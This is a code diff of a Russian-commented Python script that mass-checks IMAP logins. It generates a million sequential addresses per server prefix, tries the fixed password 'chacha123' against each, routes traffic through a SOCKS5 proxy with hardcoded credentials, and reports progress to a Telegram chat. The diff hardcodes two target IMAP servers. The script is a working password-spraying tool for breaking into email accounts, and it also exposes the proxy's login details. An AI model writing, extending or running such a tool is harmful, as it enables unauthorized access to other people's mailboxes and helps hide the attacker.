@@ -12,13 +12,19 @@ CHAT_ID = '7412395676'
 
 # Настройки прокси (логин, пароль, хост, порт)
 PROXY_HOST = '178.171.69.74'
-PROXY_PORT = 8000  # например, 1080 для SOCKS5
+PROXY_PORT = 8000  # Например, 8000 для SOCKS5
 PROXY_USERNAME = '4a3P3R'
 PROXY_PASSWORD = 'X2S9nB'
 
 # Глобальные счетчики
 checked_count = 0
 not_found_count = 0
+
+# IMAP конфигурация
+IMAP_CONFIG = [
+    {'server': 'imap.jlchacha.com', 'port': 993, 'prefix': 'jlchacha'},
+    {'server': 'imap.dd8688.shop', 'port': 993, 'prefix': 'dd8688'}
+]
 
 # Функция для отправки сообщения в Telegram
 def send_telegram_message(message):
@@ -37,23 +43,6 @@ def save_to_file(filename, content):
     except Exception as e:
         print(f"Ошибка записи в файл {filename}: {e}")
 
-# Функция для чтения IMAP серверов из файла
-def read_imap_config(filename):
-    imap_servers = []
-    try:
-        with open(filename, 'r') as file:
-            for line in file:
-                parts = line.strip().split()
-                if len(parts) == 3:
-                    imap_servers.append({
-                        'server': parts[0],
-                        'port': int(parts[1]),
-                        'prefix': parts[2]
-                    })
-    except Exception as e:
-        print(f"Ошибка чтения файла конфигурации {filename}: {e}")
-    return imap_servers
-
 # Установка прокси для imaplib через socks
 def set_proxy():
     socks.setdefaultproxy(socks.SOCKS5, PROXY_HOST, PROXY_PORT, True, PROXY_USERNAME, PROXY_PASSWORD)
@@ -67,7 +56,7 @@ def generate_emails(prefix, count=1000000):
     for number in numbers:
         formatted_number = f"{number:06}"  # Форматирование с ведущими нулями (000000-999999)
         email = f"{prefix}{formatted_number}@{prefix}.com"
-        password = "chacha123"  # Пример пароля, можете заменить на динамически генерируемый
+        password = "chacha123"  # Пример пароля
         emails.append((email, password))
     return emails
 
@@ -120,11 +109,8 @@ send_telegram_message("Бот запущен.")  # Уведомление о з�
 # Устанавливаем прокси
 set_proxy()
 
-# Чтение IMAP конфигурации из файла
-imap_servers = read_imap_config('imap_config.txt')
-
 # Проходим по каждому серверу из конфигурации
-for imap_config in imap_servers:
+for imap_config in IMAP_CONFIG:
     send_telegram_message(f"Генерация почт для {imap_config['server']}...")
     emails = generate_emails(imap_config['prefix'], count=1000000)  # Генерация email'ов
     send_telegram_message(f"Проверка почт для {imap_config['server']} начата.")
